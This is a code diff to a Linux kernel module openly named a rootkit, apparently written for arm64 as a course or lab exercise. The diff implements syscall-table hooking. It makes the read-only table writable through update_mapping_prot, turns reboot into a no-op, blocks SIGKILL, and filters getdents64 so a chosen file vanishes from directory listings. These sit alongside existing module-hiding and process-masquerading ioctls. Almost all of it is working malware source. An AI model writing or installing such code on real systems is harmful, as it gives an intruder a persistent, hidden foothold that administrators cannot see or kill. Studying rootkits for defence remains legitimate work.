@@ -29,7 +29,13 @@ dev_t dev;
 bool is_hidden;
 struct list_head *prev;
 unsigned long (*__kallsyms_lookup_name)(const char *);
-unsigned long **__sys_call_table;
+syscall_fn_t *__sys_call_table;
+syscall_fn_t __sys_reboot;
+syscall_fn_t __sys_kill;
+syscall_fn_t __sys_getdents64;
+void (*__update_mapping_prot)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t);
+bool is_hooked;
+struct hided_file file_to_hide;
 
 static int rootkit_open(struct inode *inode, struct file *filp)
 {
@@ -41,6 +47,124 @@ static int rootkit_release(struct inode *inode, struct file *filp)
 {
 	printk(KERN_INFO "%s\n", __func__);
 	return 0;
+}
+
+//sys_reboot(int magic1, int magic2, unsigned int cmd, void __user *arg)
+long my_reboot(const struct pt_regs *regs)
+{
+	pr_err("intercepting reboot...\n");	
+	return 0;
+}
+
+//sys_kill(pid_t pid, int sig)
+long my_kill(const struct pt_regs *regs)
+{
+	pr_err("intercepting kill...\n");	
+
+	if (regs->regs[1] == SIGKILL) {
+		pr_err("found SIGKILL, deny it\n");	
+		return 0;
+	}
+	return (*__sys_kill)(regs);
+}
+
+//sys_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
+long my_getdents64(const struct pt_regs *regs) {
+	
+	struct linux_dirent64 __user *user_dirents;
+	struct linux_dirent64 *dirents, *curr;
+	long bytes_read;
+	long ret_bytes_read;
+	long ret = 0;
+	long offset = 0;
+
+	pr_err("intercepting getdents64...\n");	
+
+	user_dirents = (struct linux_dirent64 __user *)regs->regs[1];
+
+	bytes_read = (*__sys_getdents64)(regs);
+	if (bytes_read <= 0) {
+		ret = bytes_read;
+		goto err;
+	}
+
+	if (file_to_hide.len <= 0) {
+		return bytes_read;
+	}
+
+	ret_bytes_read = bytes_read;
+	dirents = kmalloc(bytes_read, GFP_KERNEL);
+	if (dirents == NULL) {
+		ret = -EFAULT;
+		goto err;
+	}
+	if (copy_from_user(dirents, user_dirents, bytes_read)) {
+		ret = -EFAULT;
+		goto err_free;
+	}
+
+	while (offset < bytes_read) {
+		curr = (struct linux_dirent64 *)((void *)dirents + offset);
+		if (strncmp(file_to_hide.name, curr->d_name, file_to_hide.len) == 0) {
+			ret_bytes_read -= curr->d_reclen;
+			memmove(curr, (void *)curr + curr->d_reclen, ret_bytes_read);
+			// XXX: we assume only one file to hide for now
+			break;
+		}
+		offset += curr->d_reclen;
+	}
+	ret = ret_bytes_read;
+
+	if (copy_to_user(user_dirents, dirents, ret_bytes_read)) {
+		ret = -EFAULT;
+	}
+
+err_free:
+	kfree(dirents);
+err:
+	return ret;
+	
+}
+
+static void hook_syscalls(void)
+{
+
+	if (is_hooked)
+		return;
+
+	__sys_reboot = __sys_call_table[__NR_reboot];
+	__sys_kill = __sys_call_table[__NR_kill];
+	__sys_getdents64 = __sys_call_table[__NR_getdents64];
+
+	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
+						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL);
+
+	__sys_call_table[__NR_reboot] = my_reboot;
+	__sys_call_table[__NR_kill] = my_kill;
+	__sys_call_table[__NR_getdents64] = my_getdents64;
+	
+	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
+						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL_RO);
+
+	is_hooked = true;
+}
+
+static void unhook_syscalls(void)
+{
+	if (!is_hooked)
+		return;
+
+	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
+						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL);
+
+	__sys_call_table[__NR_reboot] = __sys_reboot;
+	__sys_call_table[__NR_kill] = __sys_kill;
+	__sys_call_table[__NR_getdents64] = __sys_getdents64;
+	
+	(*__update_mapping_prot)(virt_to_phys((void *)__sys_call_table), (unsigned long)__sys_call_table,
+						sizeof(syscall_fn_t) * __NR_syscalls, PAGE_KERNEL_RO);
+
+	is_hooked = false;
 }
 
 static int sanitize_req(struct masq_proc_req *req)
@@ -79,9 +203,15 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 
 	switch(ioctl) {
 
-	case IOCTL_MOD_HOOK:
-		//do something
+	case IOCTL_MOD_HOOK: {
+
+		if (is_hooked) {
+			unhook_syscalls();
+		} else {
+			hook_syscalls();
+		}
 		break;
+	}
 	case IOCTL_MOD_HIDE: {
 
 		if (is_hidden) {
@@ -127,14 +257,12 @@ static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
 			goto err_free;
 		}
 
-		/*
 		pr_err("after sanitization:\n");
 		for (i = 0; i < req.len; i++) {
 			pr_err("%zu:\n", i);
 			pr_err("\t%s\n", req.list[i].orig_name);
 			pr_err("\t%s\n", req.list[i].new_name);
 		}
-		*/
 
 		for_each_process(task) {
 			for (i = 0; i < req.len; i++)
@@ -150,9 +278,29 @@ err_free:
 		kfree(req.list);
 		break;
 	}
-	case IOCTL_FILE_HIDE:
-		//do something
+	case IOCTL_FILE_HIDE: {
+
+		struct hided_file __user *user_hided_file = argp;
+		// XXX: should we make sure the HOOK ioctl is called before?
+		// XXX: only one file at a time?
+		if (!is_hooked) {
+			ret = -EINVAL;
+			break;
+		}
+
+		if (copy_from_user(&file_to_hide, user_hided_file, sizeof(struct hided_file))) {
+			ret = -EFAULT;
+			break;
+		}
+		
+		if (file_to_hide.len < 0 || file_to_hide.len >= NAME_LEN) {
+			ret = -EINVAL;
+			break;
+		}
+		// NULL-terminate the given string
+		file_to_hide.name[file_to_hide.len] = '\0';
 		break;
+	}
 
 	default:
 		ret = -EINVAL;
@@ -224,18 +372,25 @@ static int __init rootkit_init(void)
 	is_hidden = false;
 	prev = THIS_MODULE->list.prev;
 
+	is_hooked = false;
+
+	file_to_hide.len = -1;
+	file_to_hide.name[0] = '\0';
+
 	// getting useful symbols
 	if (get_kallsyms_lookup_name() < 0) {
 		pr_err("get kallsyms_lookup_name failed\n");
 		ret = -EFAULT;
 		goto err_last;
 	}
-	__sys_call_table = (unsigned long **)(*__kallsyms_lookup_name)("sys_call_table");
+	__sys_call_table = (syscall_fn_t *)(*__kallsyms_lookup_name)("sys_call_table");
 	if (__sys_call_table == 0) {
 		pr_err("get sys_call_table failed\n");
 		ret = -EFAULT;
 		goto err_last;
 	}
+    __update_mapping_prot = (void (*)(phys_addr_t, unsigned long, phys_addr_t, pgprot_t))
+							(*__kallsyms_lookup_name)("update_mapping_prot");
 	//pr_err("kallsyms_lookup_name: %#010lx\n", (unsigned long)__kallsyms_lookup_name);
 	//pr_err("sys_call_table: %#010lx\n", (unsigned long)__sys_call_table);
 
@@ -257,6 +412,8 @@ err:
 static void __exit rootkit_exit(void)
 {
 	// TODO: unhook syscall
+	if (is_hooked)
+		unhook_syscalls();
 
 	pr_info("%s: removed\n", OURMODNAME);
 	cdev_del(kernel_cdev);
